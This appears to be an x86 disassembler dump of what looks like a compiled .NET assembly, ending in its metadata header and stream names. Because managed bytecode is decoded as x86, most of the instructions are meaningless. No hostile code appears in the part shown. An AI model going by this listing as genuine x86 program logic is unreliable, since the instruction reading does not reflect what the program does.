  4025b1:	06                   	push   %es
  4025b2:	00 00                	add    %al,(%eax)
  4025b4:	2b 00                	sub    (%eax),%eax
  4025b6:	dd a6 00 00 00 02    	frstor 0x2000000(%esi)
  4025bc:	7b 0a                	jnp    0x4025c8
  4025be:	00 00                	add    %al,(%eax)
  4025c0:	04 0c                	add    $0xc,%al
  4025c2:	02 7c 0a 00          	add    0x0(%edx,%ecx,1),%bh
  4025c6:	00 04 fe             	add    %al,(%esi,%edi,8)
  4025c9:	15 0a 00 00 1b       	adc    $0x1b00000a,%eax
  4025ce:	02 15 25 0a 7d 01    	add    0x17d0a25,%dl
  4025d4:	00 00                	add    %al,(%eax)
  4025d6:	04 02                	add    $0x2,%al
  4025d8:	12 02                	adc    (%edx),%al
  4025da:	28 4a 00             	sub    %cl,0x0(%edx)
  4025dd:	00 0a                	add    %cl,(%edx)
  4025df:	7d 09                	jge    0x4025ea
  4025e1:	00 00                	add    %al,(%eax)
  4025e3:	04 02                	add    $0x2,%al
  4025e5:	02 7b 09             	add    0x9(%ebx),%bh
  4025e8:	00 00                	add    %al,(%eax)
  4025ea:	04 7d                	add    $0x7d,%al
  4025ec:	08 00                	or     %al,(%eax)
  4025ee:	00 04 02             	add    %al,(%edx,%eax,1)
  4025f1:	14 7d                	adc    $0x7d,%al
  4025f3:	09 00                	or     %eax,(%eax)
  4025f5:	00 04 00             	add    %al,(%eax,%eax,1)
  4025f8:	de 05 26 00 00 de    	fiadds 0xde000026
  4025fe:	00 02                	add    %al,(%edx)
  402600:	7b 08                	jnp    0x40260a
  402602:	00 00                	add    %al,(%eax)
  402604:	04 0b                	add    $0xb,%al
  402606:	de 2f                	fisubrs (%edi)
  402608:	13 04 02             	adc    (%edx,%eax,1),%eax
  40260b:	1f                   	pop    %ds
  40260c:	fe                   	(bad)
  40260d:	7d 01                	jge    0x402610
  40260f:	00 00                	add    %al,(%eax)
  402611:	04 02                	add    $0x2,%al
  402613:	14 7d                	adc    $0x7d,%al
  402615:	06                   	push   %es
  402616:	00 00                	add    %al,(%eax)
  402618:	04 02                	add    $0x2,%al
  40261a:	14 7d                	adc    $0x7d,%al
  40261c:	07                   	pop    %es
  40261d:	00 00                	add    %al,(%eax)
  40261f:	04 02                	add    $0x2,%al
  402621:	14 7d                	adc    $0x7d,%al
  402623:	08 00                	or     %al,(%eax)
  402625:	00 04 02             	add    %al,(%edx,%eax,1)
  402628:	7c 02                	jl     0x40262c
  40262a:	00 00                	add    %al,(%eax)
  40262c:	04 11                	add    $0x11,%al
  40262e:	04 28                	add    $0x28,%al
  402630:	4b                   	dec    %ebx
  402631:	00 00                	add    %al,(%eax)
  402633:	0a 00                	or     (%eax),%al
  402635:	de 2a                	fisubrs (%edx)
  402637:	02 1f                	add    (%edi),%bl
  402639:	fe                   	(bad)
  40263a:	7d 01                	jge    0x40263d
  40263c:	00 00                	add    %al,(%eax)
  40263e:	04 02                	add    $0x2,%al
  402640:	14 7d                	adc    $0x7d,%al
  402642:	06                   	push   %es
  402643:	00 00                	add    %al,(%eax)
  402645:	04 02                	add    $0x2,%al
  402647:	14 7d                	adc    $0x7d,%al
  402649:	07                   	pop    %es
  40264a:	00 00                	add    %al,(%eax)
  40264c:	04 02                	add    $0x2,%al
  40264e:	14 7d                	adc    $0x7d,%al
  402650:	08 00                	or     %al,(%eax)
  402652:	00 04 02             	add    %al,(%edx,%eax,1)
  402655:	7c 02                	jl     0x402659
  402657:	00 00                	add    %al,(%eax)
  402659:	04 07                	add    $0x7,%al
  40265b:	28 4c 00 00          	sub    %cl,0x0(%eax,%eax,1)
  40265f:	0a 00                	or     (%eax),%al
  402661:	2a 00                	sub    (%eax),%al
  402663:	00 01                	add    %al,(%ecx)
  402665:	1c 00                	sbb    $0x0,%al
  402667:	00 00                	add    %al,(%eax)
  402669:	00 54 00 8e          	add    %dl,-0x72(%eax,%eax,1)
  40266d:	e2 00                	loop   0x40266f
  40266f:	05 1e 00 00 01       	add    $0x100001e,%eax
  402674:	00 00                	add    %al,(%eax)
  402676:	07                   	pop    %es
  402677:	00 e9                	add    %ch,%cl
  402679:	f0 00 2f             	lock add %ch,(%edi)
  40267c:	1d 00 00 01 06       	sbb    $0x6010000,%eax
  402681:	2a 22                	sub    (%edx),%ah
  402683:	02 28                	add    (%eax),%ch
  402685:	22 00                	and    (%eax),%al
  402687:	00 0a                	add    %cl,(%edx)
  402689:	00 2a                	add    %ch,(%edx)
  40268b:	00 1b                	add    %bl,(%ebx)
  40268d:	30 04 00             	xor    %al,(%eax,%eax,1)
  402690:	4a                   	dec    %edx
  402691:	01 00                	add    %eax,(%eax)
  402693:	00 09                	add    %cl,(%ecx)
  402695:	00 00                	add    %al,(%eax)
  402697:	11 02                	adc    %eax,(%edx)
  402699:	7b 0b                	jnp    0x4026a6
  40269b:	00 00                	add    %al,(%eax)
  40269d:	04 0a                	add    $0xa,%al
  40269f:	06                   	push   %es
  4026a0:	2c 02                	sub    $0x2,%al
  4026a2:	2b 02                	sub    (%edx),%eax
  4026a4:	2b 45 00             	sub    0x0(%ebp),%eax
  4026a7:	02 72 e9             	add    -0x17(%edx),%dh
  4026aa:	04 00                	add    $0x0,%al
  4026ac:	70 73                	jo     0x402721
  4026ae:	41                   	inc    %ecx
  4026af:	00 00                	add    %al,(%eax)
  4026b1:	0a 7d 10             	or     0x10(%ebp),%bh
  4026b4:	00 00                	add    %al,(%eax)
  4026b6:	04 02                	add    $0x2,%al
  4026b8:	02 7b 10             	add    0x10(%ebx),%bh
  4026bb:	00 00                	add    %al,(%eax)
  4026bd:	04 02                	add    $0x2,%al
  4026bf:	7b 0e                	jnp    0x4026cf
  4026c1:	00 00                	add    %al,(%eax)
  4026c3:	04 73                	add    $0x73,%al
  4026c5:	42                   	inc    %edx
  4026c6:	00 00                	add    %al,(%eax)
  4026c8:	0a 73 43             	or     0x43(%ebx),%dh
  4026cb:	00 00                	add    %al,(%eax)
  4026cd:	0a 25 02 7b 0f 00    	or     0xf7b02,%ah
  4026d3:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4026d6:	44                   	inc    %esp
  4026d7:	00 00                	add    %al,(%eax)
  4026d9:	0a 00                	or     (%eax),%al
  4026db:	7d 11                	jge    0x4026ee
  4026dd:	00 00                	add    %al,(%eax)
  4026df:	04 02                	add    $0x2,%al
  4026e1:	73 45                	jae    0x402728
  4026e3:	00 00                	add    %al,(%eax)
  4026e5:	0a 7d 12             	or     0x12(%ebp),%bh
  4026e8:	00 00                	add    %al,(%eax)
  4026ea:	04 00                	add    $0x0,%al
  4026ec:	06                   	push   %es
  4026ed:	2c 02                	sub    $0x2,%al
  4026ef:	2b 02                	sub    (%edx),%eax
  4026f1:	2b 48 00             	sub    0x0(%eax),%ecx
  4026f4:	02 7b 0d             	add    0xd(%ebx),%bh
  4026f7:	00 00                	add    %al,(%eax)
  4026f9:	04 02                	add    $0x2,%al
  4026fb:	7b 11                	jnp    0x40270e
  4026fd:	00 00                	add    %al,(%eax)
  4026ff:	04 6f                	add    $0x6f,%al
  402701:	46                   	inc    %esi
  402702:	00 00                	add    %al,(%eax)
  402704:	0a 6f 47             	or     0x47(%edi),%ch
  402707:	00 00                	add    %al,(%eax)
  402709:	0a 0c 12             	or     (%edx,%edx,1),%cl
  40270c:	02 28                	add    (%eax),%ch
  40270e:	48                   	dec    %eax
  40270f:	00 00                	add    %al,(%eax)
  402711:	0a 2d 43 02 16 25    	or     0x25160243,%ch
  402717:	0a 7d 0b             	or     0xb(%ebp),%bh
  40271a:	00 00                	add    %al,(%eax)
  40271c:	04 02                	add    $0x2,%al
  40271e:	08 7d 14             	or     %bh,0x14(%ebp)
  402721:	00 00                	add    %al,(%eax)
  402723:	04 02                	add    $0x2,%al
  402725:	0d 02 7c 0c 00       	or     $0xc7c02,%eax
  40272a:	00 04 12             	add    %al,(%edx,%edx,1)
  40272d:	02 12                	add    (%edx),%dl
  40272f:	03 28                	add    (%eax),%ebp
  402731:	07                   	pop    %es
  402732:	00 00                	add    %al,(%eax)
  402734:	2b 00                	sub    (%eax),%eax
  402736:	dd a6 00 00 00 02    	frstor 0x2000000(%esi)
  40273c:	7b 14                	jnp    0x402752
  40273e:	00 00                	add    %al,(%eax)
  402740:	04 0c                	add    $0xc,%al
  402742:	02 7c 14 00          	add    0x0(%esp,%edx,1),%bh
  402746:	00 04 fe             	add    %al,(%esi,%edi,8)
  402749:	15 0a 00 00 1b       	adc    $0x1b00000a,%eax
  40274e:	02 15 25 0a 7d 0b    	add    0xb7d0a25,%dl
  402754:	00 00                	add    %al,(%eax)
  402756:	04 02                	add    $0x2,%al
  402758:	12 02                	adc    (%edx),%al
  40275a:	28 4a 00             	sub    %cl,0x0(%edx)
  40275d:	00 0a                	add    %cl,(%edx)
  40275f:	7d 13                	jge    0x402774
  402761:	00 00                	add    %al,(%eax)
  402763:	04 02                	add    $0x2,%al
  402765:	02 7b 13             	add    0x13(%ebx),%bh
  402768:	00 00                	add    %al,(%eax)
  40276a:	04 7d                	add    $0x7d,%al
  40276c:	12 00                	adc    (%eax),%al
  40276e:	00 04 02             	add    %al,(%edx,%eax,1)
  402771:	14 7d                	adc    $0x7d,%al
  402773:	13 00                	adc    (%eax),%eax
  402775:	00 04 00             	add    %al,(%eax,%eax,1)
  402778:	de 05 26 00 00 de    	fiadds 0xde000026
  40277e:	00 02                	add    %al,(%edx)
  402780:	7b 12                	jnp    0x402794
  402782:	00 00                	add    %al,(%eax)
  402784:	04 0b                	add    $0xb,%al
  402786:	de 2f                	fisubrs (%edi)
  402788:	13 04 02             	adc    (%edx,%eax,1),%eax
  40278b:	1f                   	pop    %ds
  40278c:	fe                   	(bad)
  40278d:	7d 0b                	jge    0x40279a
  40278f:	00 00                	add    %al,(%eax)
  402791:	04 02                	add    $0x2,%al
  402793:	14 7d                	adc    $0x7d,%al
  402795:	10 00                	adc    %al,(%eax)
  402797:	00 04 02             	add    %al,(%edx,%eax,1)
  40279a:	14 7d                	adc    $0x7d,%al
  40279c:	11 00                	adc    %eax,(%eax)
  40279e:	00 04 02             	add    %al,(%edx,%eax,1)
  4027a1:	14 7d                	adc    $0x7d,%al
  4027a3:	12 00                	adc    (%eax),%al
  4027a5:	00 04 02             	add    %al,(%edx,%eax,1)
  4027a8:	7c 0c                	jl     0x4027b6
  4027aa:	00 00                	add    %al,(%eax)
  4027ac:	04 11                	add    $0x11,%al
  4027ae:	04 28                	add    $0x28,%al
  4027b0:	4b                   	dec    %ebx
  4027b1:	00 00                	add    %al,(%eax)
  4027b3:	0a 00                	or     (%eax),%al
  4027b5:	de 2a                	fisubrs (%edx)
  4027b7:	02 1f                	add    (%edi),%bl
  4027b9:	fe                   	(bad)
  4027ba:	7d 0b                	jge    0x4027c7
  4027bc:	00 00                	add    %al,(%eax)
  4027be:	04 02                	add    $0x2,%al
  4027c0:	14 7d                	adc    $0x7d,%al
  4027c2:	10 00                	adc    %al,(%eax)
  4027c4:	00 04 02             	add    %al,(%edx,%eax,1)
  4027c7:	14 7d                	adc    $0x7d,%al
  4027c9:	11 00                	adc    %eax,(%eax)
  4027cb:	00 04 02             	add    %al,(%edx,%eax,1)
  4027ce:	14 7d                	adc    $0x7d,%al
  4027d0:	12 00                	adc    (%eax),%al
  4027d2:	00 04 02             	add    %al,(%edx,%eax,1)
  4027d5:	7c 0c                	jl     0x4027e3
  4027d7:	00 00                	add    %al,(%eax)
  4027d9:	04 07                	add    $0x7,%al
  4027db:	28 4c 00 00          	sub    %cl,0x0(%eax,%eax,1)
  4027df:	0a 00                	or     (%eax),%al
  4027e1:	2a 00                	sub    (%eax),%al
  4027e3:	00 01                	add    %al,(%ecx)
  4027e5:	1c 00                	sbb    $0x0,%al
  4027e7:	00 00                	add    %al,(%eax)
  4027e9:	00 54 00 8e          	add    %dl,-0x72(%eax,%eax,1)
  4027ed:	e2 00                	loop   0x4027ef
  4027ef:	05 1e 00 00 01       	add    $0x100001e,%eax
  4027f4:	00 00                	add    %al,(%eax)
  4027f6:	07                   	pop    %es
  4027f7:	00 e9                	add    %ch,%cl
  4027f9:	f0 00 2f             	lock add %ch,(%edi)
  4027fc:	1d 00 00 01 06       	sbb    $0x6010000,%eax
  402801:	2a 1e                	sub    (%esi),%bl
  402803:	02 7b 15             	add    0x15(%ebx),%bh
  402806:	00 00                	add    %al,(%eax)
  402808:	04 2a                	add    $0x2a,%al
  40280a:	22 02                	and    (%edx),%al
  40280c:	03 7d 15             	add    0x15(%ebp),%edi
  40280f:	00 00                	add    %al,(%eax)
  402811:	04 2a                	add    $0x2a,%al
  402813:	1e                   	push   %ds
  402814:	02 7b 16             	add    0x16(%ebx),%bh
  402817:	00 00                	add    %al,(%eax)
  402819:	04 2a                	add    $0x2a,%al
  40281b:	22 02                	and    (%edx),%al
  40281d:	03 7d 16             	add    0x16(%ebp),%edi
  402820:	00 00                	add    %al,(%eax)
  402822:	04 2a                	add    $0x2a,%al
  402824:	1e                   	push   %ds
  402825:	02 7b 17             	add    0x17(%ebx),%bh
  402828:	00 00                	add    %al,(%eax)
  40282a:	04 2a                	add    $0x2a,%al
  40282c:	22 02                	and    (%edx),%al
  40282e:	03 7d 17             	add    0x17(%ebp),%edi
  402831:	00 00                	add    %al,(%eax)
  402833:	04 2a                	add    $0x2a,%al
  402835:	1e                   	push   %ds
  402836:	02 7b 18             	add    0x18(%ebx),%bh
  402839:	00 00                	add    %al,(%eax)
  40283b:	04 2a                	add    $0x2a,%al
  40283d:	22 02                	and    (%edx),%al
  40283f:	03 7d 18             	add    0x18(%ebp),%edi
  402842:	00 00                	add    %al,(%eax)
  402844:	04 2a                	add    $0x2a,%al
  402846:	1e                   	push   %ds
  402847:	02 7b 19             	add    0x19(%ebx),%bh
  40284a:	00 00                	add    %al,(%eax)
  40284c:	04 2a                	add    $0x2a,%al
  40284e:	22 02                	and    (%edx),%al
  402850:	03 7d 19             	add    0x19(%ebp),%edi
  402853:	00 00                	add    %al,(%eax)
  402855:	04 2a                	add    $0x2a,%al
  402857:	22 02                	and    (%edx),%al
  402859:	28 22                	sub    %ah,(%edx)
  40285b:	00 00                	add    %al,(%eax)
  40285d:	0a 00                	or     (%eax),%al
  40285f:	2a 1e                	sub    (%esi),%bl
  402861:	02 7b 1a             	add    0x1a(%ebx),%bh
  402864:	00 00                	add    %al,(%eax)
  402866:	04 2a                	add    $0x2a,%al
  402868:	22 02                	and    (%edx),%al
  40286a:	03 7d 1a             	add    0x1a(%ebp),%edi
  40286d:	00 00                	add    %al,(%eax)
  40286f:	04 2a                	add    $0x2a,%al
  402871:	1e                   	push   %ds
  402872:	02 7b 1b             	add    0x1b(%ebx),%bh
  402875:	00 00                	add    %al,(%eax)
  402877:	04 2a                	add    $0x2a,%al
  402879:	22 02                	and    (%edx),%al
  40287b:	03 7d 1b             	add    0x1b(%ebp),%edi
  40287e:	00 00                	add    %al,(%eax)
  402880:	04 2a                	add    $0x2a,%al
  402882:	1e                   	push   %ds
  402883:	02 7b 1c             	add    0x1c(%ebx),%bh
  402886:	00 00                	add    %al,(%eax)
  402888:	04 2a                	add    $0x2a,%al
  40288a:	22 02                	and    (%edx),%al
  40288c:	03 7d 1c             	add    0x1c(%ebp),%edi
  40288f:	00 00                	add    %al,(%eax)
  402891:	04 2a                	add    $0x2a,%al
  402893:	1e                   	push   %ds
  402894:	02 7b 1d             	add    0x1d(%ebx),%bh
  402897:	00 00                	add    %al,(%eax)
  402899:	04 2a                	add    $0x2a,%al
  40289b:	22 02                	and    (%edx),%al
  40289d:	03 7d 1d             	add    0x1d(%ebp),%edi
  4028a0:	00 00                	add    %al,(%eax)
  4028a2:	04 2a                	add    $0x2a,%al
  4028a4:	22 02                	and    (%edx),%al
  4028a6:	28 22                	sub    %ah,(%edx)
  4028a8:	00 00                	add    %al,(%eax)
  4028aa:	0a 00                	or     (%eax),%al
  4028ac:	2a 1e                	sub    (%esi),%bl
  4028ae:	02 7b 1e             	add    0x1e(%ebx),%bh
  4028b1:	00 00                	add    %al,(%eax)
  4028b3:	04 2a                	add    $0x2a,%al
  4028b5:	22 02                	and    (%edx),%al
  4028b7:	03 7d 1e             	add    0x1e(%ebp),%edi
  4028ba:	00 00                	add    %al,(%eax)
  4028bc:	04 2a                	add    $0x2a,%al
  4028be:	1e                   	push   %ds
  4028bf:	02 7b 1f             	add    0x1f(%ebx),%bh
  4028c2:	00 00                	add    %al,(%eax)
  4028c4:	04 2a                	add    $0x2a,%al
  4028c6:	22 02                	and    (%edx),%al
  4028c8:	03 7d 1f             	add    0x1f(%ebp),%edi
  4028cb:	00 00                	add    %al,(%eax)
  4028cd:	04 2a                	add    $0x2a,%al
  4028cf:	1e                   	push   %ds
  4028d0:	02 7b 20             	add    0x20(%ebx),%bh
  4028d3:	00 00                	add    %al,(%eax)
  4028d5:	04 2a                	add    $0x2a,%al
  4028d7:	22 02                	and    (%edx),%al
  4028d9:	03 7d 20             	add    0x20(%ebp),%edi
  4028dc:	00 00                	add    %al,(%eax)
  4028de:	04 2a                	add    $0x2a,%al
  4028e0:	1e                   	push   %ds
  4028e1:	02 7b 21             	add    0x21(%ebx),%bh
  4028e4:	00 00                	add    %al,(%eax)
  4028e6:	04 2a                	add    $0x2a,%al
  4028e8:	22 02                	and    (%edx),%al
  4028ea:	03 7d 21             	add    0x21(%ebp),%edi
  4028ed:	00 00                	add    %al,(%eax)
  4028ef:	04 2a                	add    $0x2a,%al
  4028f1:	1e                   	push   %ds
  4028f2:	02 7b 22             	add    0x22(%ebx),%bh
  4028f5:	00 00                	add    %al,(%eax)
  4028f7:	04 2a                	add    $0x2a,%al
  4028f9:	22 02                	and    (%edx),%al
  4028fb:	03 7d 22             	add    0x22(%ebp),%edi
  4028fe:	00 00                	add    %al,(%eax)
  402900:	04 2a                	add    $0x2a,%al
  402902:	22 02                	and    (%edx),%al
  402904:	28 22                	sub    %ah,(%edx)
  402906:	00 00                	add    %al,(%eax)
  402908:	0a 00                	or     (%eax),%al
  40290a:	2a 1e                	sub    (%esi),%bl
  40290c:	02 7b 23             	add    0x23(%ebx),%bh
  40290f:	00 00                	add    %al,(%eax)
  402911:	04 2a                	add    $0x2a,%al
  402913:	22 02                	and    (%edx),%al
  402915:	03 7d 23             	add    0x23(%ebp),%edi
  402918:	00 00                	add    %al,(%eax)
  40291a:	04 2a                	add    $0x2a,%al
  40291c:	1e                   	push   %ds
  40291d:	02 7b 24             	add    0x24(%ebx),%bh
  402920:	00 00                	add    %al,(%eax)
  402922:	04 2a                	add    $0x2a,%al
  402924:	22 02                	and    (%edx),%al
  402926:	03 7d 24             	add    0x24(%ebp),%edi
  402929:	00 00                	add    %al,(%eax)
  40292b:	04 2a                	add    $0x2a,%al
  40292d:	1e                   	push   %ds
  40292e:	02 7b 25             	add    0x25(%ebx),%bh
  402931:	00 00                	add    %al,(%eax)
  402933:	04 2a                	add    $0x2a,%al
  402935:	22 02                	and    (%edx),%al
  402937:	03 7d 25             	add    0x25(%ebp),%edi
  40293a:	00 00                	add    %al,(%eax)
  40293c:	04 2a                	add    $0x2a,%al
  40293e:	1e                   	push   %ds
  40293f:	02 7b 26             	add    0x26(%ebx),%bh
  402942:	00 00                	add    %al,(%eax)
  402944:	04 2a                	add    $0x2a,%al
  402946:	22 02                	and    (%edx),%al
  402948:	03 7d 26             	add    0x26(%ebp),%edi
  40294b:	00 00                	add    %al,(%eax)
  40294d:	04 2a                	add    $0x2a,%al
  40294f:	22 02                	and    (%edx),%al
  402951:	28 22                	sub    %ah,(%edx)
  402953:	00 00                	add    %al,(%eax)
  402955:	0a 00                	or     (%eax),%al
  402957:	2a 1e                	sub    (%esi),%bl
  402959:	02 7b 27             	add    0x27(%ebx),%bh
  40295c:	00 00                	add    %al,(%eax)
  40295e:	04 2a                	add    $0x2a,%al
  402960:	22 02                	and    (%edx),%al
  402962:	03 7d 27             	add    0x27(%ebp),%edi
  402965:	00 00                	add    %al,(%eax)
  402967:	04 2a                	add    $0x2a,%al
  402969:	1e                   	push   %ds
  40296a:	02 7b 28             	add    0x28(%ebx),%bh
  40296d:	00 00                	add    %al,(%eax)
  40296f:	04 2a                	add    $0x2a,%al
  402971:	22 02                	and    (%edx),%al
  402973:	03 7d 28             	add    0x28(%ebp),%edi
  402976:	00 00                	add    %al,(%eax)
  402978:	04 2a                	add    $0x2a,%al
  40297a:	1e                   	push   %ds
  40297b:	02 7b 29             	add    0x29(%ebx),%bh
  40297e:	00 00                	add    %al,(%eax)
  402980:	04 2a                	add    $0x2a,%al
  402982:	22 02                	and    (%edx),%al
  402984:	03 7d 29             	add    0x29(%ebp),%edi
  402987:	00 00                	add    %al,(%eax)
  402989:	04 2a                	add    $0x2a,%al
  40298b:	1e                   	push   %ds
  40298c:	02 7b 2a             	add    0x2a(%ebx),%bh
  40298f:	00 00                	add    %al,(%eax)
  402991:	04 2a                	add    $0x2a,%al
  402993:	22 02                	and    (%edx),%al
  402995:	03 7d 2a             	add    0x2a(%ebp),%edi
  402998:	00 00                	add    %al,(%eax)
  40299a:	04 2a                	add    $0x2a,%al
  40299c:	1e                   	push   %ds
  40299d:	02 7b 2b             	add    0x2b(%ebx),%bh
  4029a0:	00 00                	add    %al,(%eax)
  4029a2:	04 2a                	add    $0x2a,%al
  4029a4:	22 02                	and    (%edx),%al
  4029a6:	03 7d 2b             	add    0x2b(%ebp),%edi
  4029a9:	00 00                	add    %al,(%eax)
  4029ab:	04 2a                	add    $0x2a,%al
  4029ad:	1e                   	push   %ds
  4029ae:	02 7b 2c             	add    0x2c(%ebx),%bh
  4029b1:	00 00                	add    %al,(%eax)
  4029b3:	04 2a                	add    $0x2a,%al
  4029b5:	22 02                	and    (%edx),%al
  4029b7:	03 7d 2c             	add    0x2c(%ebp),%edi
  4029ba:	00 00                	add    %al,(%eax)
  4029bc:	04 2a                	add    $0x2a,%al
  4029be:	22 02                	and    (%edx),%al
  4029c0:	28 22                	sub    %ah,(%edx)
  4029c2:	00 00                	add    %al,(%eax)
  4029c4:	0a 00                	or     (%eax),%al
  4029c6:	2a 1e                	sub    (%esi),%bl
  4029c8:	02 7b 2d             	add    0x2d(%ebx),%bh
  4029cb:	00 00                	add    %al,(%eax)
  4029cd:	04 2a                	add    $0x2a,%al
  4029cf:	22 02                	and    (%edx),%al
  4029d1:	03 7d 2d             	add    0x2d(%ebp),%edi
  4029d4:	00 00                	add    %al,(%eax)
  4029d6:	04 2a                	add    $0x2a,%al
  4029d8:	22 02                	and    (%edx),%al
  4029da:	28 22                	sub    %ah,(%edx)
  4029dc:	00 00                	add    %al,(%eax)
  4029de:	0a 00                	or     (%eax),%al
  4029e0:	2a 00                	sub    (%eax),%al
  4029e2:	00 00                	add    %al,(%eax)
  4029e4:	42                   	inc    %edx
  4029e5:	53                   	push   %ebx
  4029e6:	4a                   	dec    %edx
  4029e7:	42                   	inc    %edx
  4029e8:	01 00                	add    %eax,(%eax)
  4029ea:	01 00                	add    %eax,(%eax)
  4029ec:	00 00                	add    %al,(%eax)
  4029ee:	00 00                	add    %al,(%eax)
  4029f0:	0c 00                	or     $0x0,%al
  4029f2:	00 00                	add    %al,(%eax)
  4029f4:	76 34                	jbe    0x402a2a
  4029f6:	2e 30 2e             	xor    %ch,%cs:(%esi)
  4029f9:	33 30                	xor    (%eax),%esi
  4029fb:	33 31                	xor    (%ecx),%esi
  4029fd:	39 00                	cmp    %eax,(%eax)
  4029ff:	00 00                	add    %al,(%eax)
  402a01:	00 05 00 6c 00 00    	add    %al,0x6c00
  402a07:	00 a4 0f 00 00 23 7e 	add    %ah,0x7e230000(%edi,%ecx,1)
  402a0e:	00 00                	add    %al,(%eax)
  402a10:	10 10                	adc    %dl,(%eax)
  402a12:	00 00                	add    %al,(%eax)
  402a14:	c4 0a                	les    (%edx),%ecx
  402a16:	00 00                	add    %al,(%eax)
  402a18:	23 53 74             	and    0x74(%ebx),%edx
  402a1b:	72 69                	jb     0x402a86
  402a1d:	6e                   	outsb  %ds:(%esi),(%dx)
  402a1e:	67 73 00             	addr16 jae 0x402a21
  402a21:	00 00                	add    %al,(%eax)
  402a23:	00 d4                	add    %dl,%ah
  402a25:	1a 00                	sbb    (%eax),%al
  402a27:	00 fc                	add    %bh,%ah
  402a29:	04 00                	add    $0x0,%al
  402a2b:	00 23                	add    %ah,(%ebx)
  402a2d:	55                   	push   %ebp
  402a2e:	53                   	push   %ebx
  402a2f:	00 d0                	add    %dl,%al
  402a31:	1f                   	pop    %ds
  402a32:	00 00                	add    %al,(%eax)
  402a34:	10 00                	adc    %al,(%eax)
  402a36:	00 00                	add    %al,(%eax)
  402a38:	23 47 55             	and    0x55(%edi),%eax
  402a3b:	49                   	dec    %ecx
  402a3c:	44                   	inc    %esp
  402a3d:	00 00                	add    %al,(%eax)
  402a3f:	00 e0                	add    %ah,%al
  402a41:	1f                   	pop    %ds
  402a42:	00 00                	add    %al,(%eax)
  402a44:	8c 04 00             	mov    %es,(%eax,%eax,1)
  402a47:	00 23                	add    %ah,(%ebx)
  402a49:	42                   	inc    %edx
  402a4a:	6c                   	insb   (%dx),%es:(%edi)
  402a4b:	6f                   	outsl  %ds:(%esi),(%dx)
  402a4c:	62 00                	bound  %eax,(%eax)
  402a4e:	00 00                	add    %al,(%eax)
  402a50:	00 00                	add    %al,(%eax)
  402a52:	00 00                	add    %al,(%eax)
  402a54:	02 00                	add    (%eax),%al
  402a56:	00 01                	add    %al,(%ecx)
  402a58:	57                   	push   %edi
  402a59:	17                   	pop    %ss
  402a5a:	a2 0b 09 0a 00       	mov    %al,0xa090b
  402a5f:	00 00                	add    %al,(%eax)
  402a61:	fa                   	cli
  402a62:	01 33                	add    %esi,(%ebx)
  402a64:	00 16                	add    %dl,(%esi)
  402a66:	00 00                	add    %al,(%eax)
  402a68:	01 00                	add    %eax,(%eax)
  402a6a:	00 00                	add    %al,(%eax)
  402a6c:	34 00                	xor    $0x0,%al
  402a6e:	00 00                	add    %al,(%eax)
  402a70:	0c 00                	or     $0x0,%al
  402a72:	00 00                	add    %al,(%eax)
  402a74:	2d 00 00 00 47       	sub    $0x47000000,%eax
  402a79:	00 00                	add    %al,(%eax)
  402a7b:	00 26                	add    %ah,(%esi)
  402a7d:	00 00                	add    %al,(%eax)
  402a7f:	00 02                	add    %al,(%edx)
  402a81:	00 00                	add    %al,(%eax)
  402a83:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  402a87:	00 7e 00             	add    %bh,0x0(%esi)
  402a8a:	00 00                	add    %al,(%eax)
  402a8c:	09 00                	or     %eax,(%eax)
  402a8e:	00 00                	add    %al,(%eax)
  402a90:	06                   	push   %es
  402a91:	00 00                	add    %al,(%eax)
  402a93:	00 19                	add    %bl,(%ecx)
  402a95:	00 00                	add    %al,(%eax)
  402a97:	00 32                	add    %dh,(%edx)
  402a99:	00 00                	add    %al,(%eax)
  402a9b:	00 04 00             	add    %al,(%eax,%eax,1)
  402a9e:	00 00                	add    %al,(%eax)
  402aa0:	0a 00                	or     (%eax),%al
  402aa2:	00 00                	add    %al,(%eax)
  402aa4:	01 00                	add    %eax,(%eax)
  402aa6:	00 00                	add    %al,(%eax)
  402aa8:	04 00                	add    $0x0,%al
  402aaa:	00 00                	add    %al,(%eax)
  402aac:	08 00                	or     %al,(%eax)
  402aae:	00 00                	add    %al,(%eax)
  402ab0:	07                   	pop    %es
  402ab1:	00 00                	add    %al,(%eax)
  402ab3:	00 00                	add    %al,(%eax)
  402ab5:	00 8a 06 01 00 00    	add    %cl,0x106(%edx)
  402abb:	00 00                	add    %al,(%eax)
  402abd:	00 06                	add    %al,(%esi)
  402abf:	00 8d 05 68 08 06    	add    %cl,0x6086805(%ebp)
  402ac5:	00 f9                	add    %bh,%cl
  402ac7:	05 68 08 06 00       	add    $0x60868,%eax
  402acc:	66 06                	pushw  %es
  402ace:	68 08 06 00 af       	push   $0xaf000608
  402ad3:	04 1b                	add    $0x1b,%al
  402ad5:	08 13                	or     %dl,(%ebx)
  402ad7:	00 88 08 00 00 06    	add    %cl,0x6000008(%eax)
  402add:	00 f2                	add    %dh,%dl
  402adf:	04 1a                	add    $0x1a,%al
  402ae1:	07                   	pop    %es
  402ae2:	06                   	push   %es
  402ae3:	00 dc                	add    %bl,%ah
  402ae5:	05 1a 07 06 00       	add    $0x6071a,%eax
  402aea:	bd 05 1a 07 06       	mov    $0x6071a05,%ebp
  402aef:	00 4d 06             	add    %cl,0x6(%ebp)
  402af2:	1a 07                	sbb    (%edi),%al
  402af4:	06                   	push   %es
  402af5:	00 19                	add    %bl,(%ecx)
  402af7:	06                   	push   %es
  402af8:	1a 07                	sbb    (%edi),%al
  402afa:	06                   	push   %es
  402afb:	00 32                	add    %dh,(%edx)
  402afd:	06                   	push   %es
  402afe:	1a 07                	sbb    (%edi),%al
  402b00:	06                   	push   %es
  402b01:	00 41 05             	add    %al,0x5(%ecx)
  402b04:	1a 07                	sbb    (%edi),%al
  402b06:	06                   	push   %es
  402b07:	00 de                	add    %bl,%dh
  402b09:	04 49                	add    $0x49,%al
  402b0b:	08 06                	or     %al,(%esi)
  402b0d:	00 a1 04 49 08 06    	add    %ah,0x6084904(%ecx)
  402b13:	00 a0 05 1a 07 06    	add    %ah,0x6071a05(%eax)
  402b19:	00 5c 05 bc          	add    %bl,-0x44(%ebp,%eax,1)
  402b1d:	06                   	push   %es
  402b1e:	06                   	push   %es
  402b1f:	00 bc 09 f6 06 0a 00 	add    %bh,0xa06f6(%ecx,%ecx,1)
  402b26:	f2 09 c3             	repnz or %eax,%ebx
  402b29:	09 06                	or     %eax,(%esi)
  402b2b:	00 31                	add    %dh,(%ecx)
  402b2d:	04 f6                	add    $0xf6,%al
  402b2f:	06                   	push   %es
  402b30:	06                   	push   %es
